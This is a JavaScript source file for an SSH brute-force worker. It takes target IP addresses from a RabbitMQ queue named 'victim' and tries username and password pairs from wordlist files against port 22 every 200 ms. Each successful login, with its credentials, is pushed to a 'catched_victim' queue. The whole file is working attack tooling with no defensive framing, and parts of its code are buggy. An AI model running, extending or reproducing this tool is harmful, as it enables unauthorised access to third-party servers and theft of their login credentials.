// IMPORT LIB
import 'babel-polyfill'
import amqp from 'amqplib'
import fs from 'fs'
import os from 'os'
import path from 'path'
import event from 'eventemitter3'
const Client = require('ssh2').Client
// GET DATA FROM DOCS FILE

// CLASS WORKER
class Worker extends event {
    constructor(url) {
        super()
        this.amqpURL = url;
        this.usernamePos = 0;
        this.passwordPos = 0;
        this.interval = "";
        this.message = "";
    }

    loadData() {
        this.passwordData = fs.readFileSync(path.join(__dirname + '/docs/password.txt'));
        this.usernameData = fs.readFileSync(path.join(__dirname + "/docs/username.txt"));
        //TRANFER IT TO ARRAYLIST AND SPLIT \n
        this.passwordList = this.passwordData.toString().split(os.EOL)
        this.usernameList = this.usernameData.toString().split(os.EOL)
    }

    listen_for_event() {
        // LISTEN FOR SUCCESS CASE
        this.on("success", victim => {
            let msg = JSON.stringify(victim)
            this.channel.sendToQueue('catched_victim', Buffer.from(msg), {
                persistent: true
            });
            this.emit("end")
        })

        //LISTEN FOR END CASE
        this.on("end", () => {
            this.usernamePos = 0;
            this.passwordPos = 0;
            clearInterval(this.interval)
            this.channel.ack(this.message)
        })

        // LISTEN FOR NEXT CASE
        this.on("next", () => {
            // CHECK POS IN PASSWORD LIST
            if (this.passwordPos < this.passwordList.length - 1) {
                this.handle_victim(this.message, this.usernameList[this.usernamePos], this.passwordList[this.passwordPos])
                this.passwordPos++
            }
            //IF END OF PASSWORD LIST => INC USER BY ONE, RESET PASSWORD POS
             else if (this.passwordPos == this.passwordList.length - 1) {
                this.usernamePos++;
                this.passwordPos = 0;
                this.handle_victim(this.message, this.usernameList[this.usernamePos], this.passwordList[this.passwordPos])

            } else if(this.usernamePos == this.usernameList.length - 1 && this.passwordPos == this.passwordList.length - 1) {
                this.emit("end");
            }
        })
    }


    async getVictim(q) {
        // OPEN CONNECTION
        this.connection = await amqp.connect(this.amqpURL)
        this.channel = await this.connection.createChannel()
        // JOIN THE QUERE Q => victim
        this.channel.assertQueue(q, {
            durable: true
        })
        // LIMIT MESSAGE TO EXECUTE
        this.channel.prefetch(1)
        console.log("listen for quere:" + q)
        // LISTEN FOR MESSAGE SIGNAL FROM QUERE Q => victim
        this.channel.consume(q, msg => {
            if (msg) {
                this.message = msg.content.toString()
                this.interval = setInterval(() => {
                    this.emit("next");
                }, 200);
            }
        }, {
            noAck: true
        })
    }
    // FUNCTION TO STORE VICTIM TO DATABASE
    async handle_victim(ip, username, password) {
        // PARAMETER:
        // ip:IP OF THE VICTIM
        // username:username of ssh list
        //password:password of the ssh list
        this.client = new Client()
        console.log(username + "---" + password)
        // HANDLE ERROR CASE
        this.client.on("error", err => {
            console.log(err)
        }).on("ready", () => {
            console.log("SUCCESS WITH IP " + ip)
            let victim = {
                port: client.config.port,
                IP: client.config.host,
                username: client.config.username,
                password: client.config.password
            }
            this.client.end()
            //EMIT SUCCESS EVENT WITH THE VICTIM THE CATCHED
            this.emit("success", victim)
        }).connect({
            port: 22,
            host: ip,
            username: username,
            password: password,
            readyTimeout: 5000
        })
    }
}
let worker = new Worker('amqp://localhost')
worker.loadData()
worker.listen_for_event()
worker.getVictim('victim')